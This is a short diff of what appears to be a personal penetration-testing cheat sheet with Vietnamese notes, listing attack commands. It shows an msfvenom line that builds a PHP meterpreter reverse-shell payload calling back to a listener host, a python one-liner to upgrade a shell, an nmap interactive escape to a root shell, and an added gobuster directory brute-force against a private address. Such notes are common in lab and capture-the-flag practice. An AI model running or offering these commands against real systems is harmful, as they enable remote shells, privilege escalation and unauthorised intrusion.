@@ -23,3 +23,5 @@ msfvenom -p php/meterpreter/reverse_tcp LHOST=192.168.0.104 LPORT=4444 -e php/ba
 python -c 'import pty; pty.spawn("/bin/sh")' (nang cap shell len terminal)
 
 nmap --interactive -> !sh
+
+gobuster dir -u http://172.16.86.153 -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt  -x php,bak,txt,html -t 60
